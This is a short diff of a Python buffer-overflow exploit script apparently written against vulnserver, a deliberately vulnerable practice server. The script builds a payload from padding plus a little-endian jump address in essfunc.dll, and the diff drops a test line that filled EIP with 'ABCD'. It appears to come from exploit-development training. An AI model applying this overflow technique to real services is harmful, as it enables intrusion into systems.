@@ -8,7 +8,6 @@ import socket
 from options import HOST, PORT, SHELLCODE_OFFSET, ESSFUNC_DLL_JMP_LOCATION_LITTLE_ENDIAN
 
 shellcode = ('A' * SHELLCODE_OFFSET)
-shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
 shellcode += ESSFUNC_DLL_JMP_LOCATION_LITTLE_ENDIAN
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
